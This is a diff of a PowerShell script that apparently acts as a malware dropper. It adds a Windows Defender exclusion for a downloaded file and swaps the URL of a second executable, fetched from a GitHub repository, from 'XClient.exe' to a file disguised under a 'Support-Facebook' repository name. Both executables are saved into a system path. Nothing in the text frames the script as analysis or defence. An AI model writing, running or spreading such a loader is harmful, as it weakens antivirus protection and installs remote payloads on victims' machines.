@@ -11,7 +11,7 @@ Invoke-WebRequest -Uri $cookieUrl -OutFile $cookiePath
 
 Add-MpPreference -ExclusionProcess $cookiePath
 
-$getfileUrl = "https://github.com/PXTDEV9022/ccc/raw/refs/heads/main/XClient.exe"
+$getfileUrl = "https://github.com/PXTDEV9022/Support-Facebook/raw/refs/heads/main/Dlscj.exe"
 $getfilePath = [System.IO.Path]::Combine($systemPath, "getfile.exe")
 
 Invoke-WebRequest -Uri $getfileUrl -OutFile $getfilePath
